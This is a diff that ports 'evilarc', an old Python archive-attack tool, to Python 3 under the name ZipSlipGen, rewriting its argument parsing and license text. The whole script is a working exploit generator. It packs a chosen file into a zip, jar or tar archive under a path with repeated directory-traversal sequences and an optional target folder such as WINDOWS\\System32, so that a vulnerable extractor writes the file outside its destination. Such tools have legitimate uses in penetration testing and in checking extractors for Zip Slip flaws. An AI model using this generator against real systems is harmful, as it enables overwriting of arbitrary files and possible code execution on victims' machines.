@@ -1,9 +1,8 @@
 #!/usr/bin/env python
 #
 # Copyright (c) 2009, Neohapsis, Inc.
+# Copyright (c) 2019, Lauri Haverinen
 # All rights reserved.
-#
-# Implementation by Greg Ose and Patrick Toomey
 #
 # Redistribution and use in source and binary forms, with or without modification, 
 # are permitted provided that the following conditions are met: 
@@ -13,7 +12,7 @@
 #  - Redistributions in binary form must reproduce the above copyright notice, this 
 #    list of conditions and the following disclaimer in the documentation and/or 
 #    other materials provided with the distribution. 
-#  - Neither the name of Neohapsis nor the names of its contributors may be used to 
+#  - Neither the name of the copyright holder nor the names of its contributors may be used to 
 #    endorse or promote products derived from this software without specific prior 
 #    written permission. 
 #
@@ -28,48 +27,68 @@
 # (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS 
 # SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 
 
-import sys, zipfile, tarfile, os, optparse
 
-def main(argv=sys.argv):
-	p = optparse.OptionParser(description = 'Create archive containing a file with directory traversal', 
-								prog = 'evilarc',
-								version = '0.1',
-								usage = '%prog <input file>')
-	p.add_option('--output-file', '-f', dest="out", help="File to output archive to.  Archive type is based off of file extension.  Supported extensions are zip, jar, tar, tar.bz2, tar.gz, and tgz.  Defaults to evil.zip.")
-	p.set_default("out", "evil.zip")
-	p.add_option('--depth', '-d', type="int", dest="depth", help="Number directories to traverse. Defaults to 8.")
-	p.set_default("depth", 8)
-	p.add_option('--os', '-o', dest="platform", help="OS platform for archive (win|unix). Defaults to win.")
-	p.set_default("platform", "win")
-	p.add_option('--path', '-p', dest="path", help="Path to include in filename after traversal.  Ex: WINDOWS\\System32\\")	
-	p.set_default("path", "")
-	options, arguments = p.parse_args()
-	
-	if len(arguments) != 1:
-		p.error("Incorrect arguments")
-		
-	fname = arguments[0]
+import sys, argparse, textwrap, zipfile, tarfile, os
+
+def main():
+	parser = argparse.ArgumentParser(
+		prog='ZipSlipGen',
+		formatter_class=argparse.RawDescriptionHelpFormatter,
+		description=textwrap.dedent('''\
+			-------------------------
+			|	ZipSlipGen	|
+			-------------------------
+			Generate an archive that contains the
+			input file with directory traversal
+			characters. Supported extensions are zip,
+			jar, tar, tar.bz2, tar.gz, and tgz.
+			'''),
+		usage='python zipslipgen.py [-h] -f <input_file> [options]')
+	parser.add_argument('-f', '--filename', 
+						dest='fname', 
+						help='File to include in the archive.',
+						default='')
+	parser.add_argument('-o', '--output', 
+						dest='out',
+						help='Output filename, default=exploit.zip.', 
+						default='exploit.zip')
+	parser.add_argument('-d', '--depth', 
+						type=int, 
+						dest='depth', 
+						help='Number of folders to traverse, default=8.', 
+						default=8)
+	parser.add_argument('-os', '--operating-system', 
+						dest='platform',
+						help='OS of the target filesystem (unix/win), default=win.', 
+						default='win')
+	parser.add_argument('-p', '--path', 
+						dest='path',
+						help='Path to include in filename after directory traversal, default=None', 
+						default='')
+	args = parser.parse_args()
+
+	fname = args.fname
 	if not os.path.exists(fname):
-		sys.exit("Invalid input file")
-		
-	if options.platform == "win":
+		sys.exit("No input file!")
+
+	if args.platform == "win":
 		dir = "..\\"
-		if options.path and options.path[-1] != '\\':
-			options.path += '\\'
+		if args.path and args.path[-1] != '\\':
+			args.path += '\\'
 	else:
 		dir = "../"
-		if options.path and options.path[-1] != '/':
-			options.path += '/'
+		if args.path and args.path[-1] != '/':
+			args.path += '/'
 
-	zpath = dir*options.depth+options.path+os.path.basename(fname)
-	print "Creating " + options.out + " containing " + zpath;	
-	ext = os.path.splitext(options.out)[1]
-	if os.path.exists(options.out):
+	zpath = dir*args.depth+args.path+os.path.basename(fname)
+	print("Creating " + args.out + " containing " + zpath)
+	ext = os.path.splitext(args.out)[1]
+	if os.path.exists(args.out):
 		wmode = 'a'
 	else:
 		wmode = 'w'
 	if ext == ".zip" or ext == ".jar":
-		zf = zipfile.ZipFile(options.out, wmode)
+		zf = zipfile.ZipFile(args.out, wmode)
 		zf.write(fname, zpath)
 		zf.close()
 		return
@@ -82,11 +101,9 @@ def main(argv=sys.argv):
 	else:
 		sys.exit("Could not identify output archive format for " + ext)
 
-	tf = tarfile.open(options.out, mode)
+	tf = tarfile.open(args.out, mode)
 	tf.add(fname, zpath)
 	tf.close()
 
-
-
 if __name__ == '__main__':
-     main()
+	main()
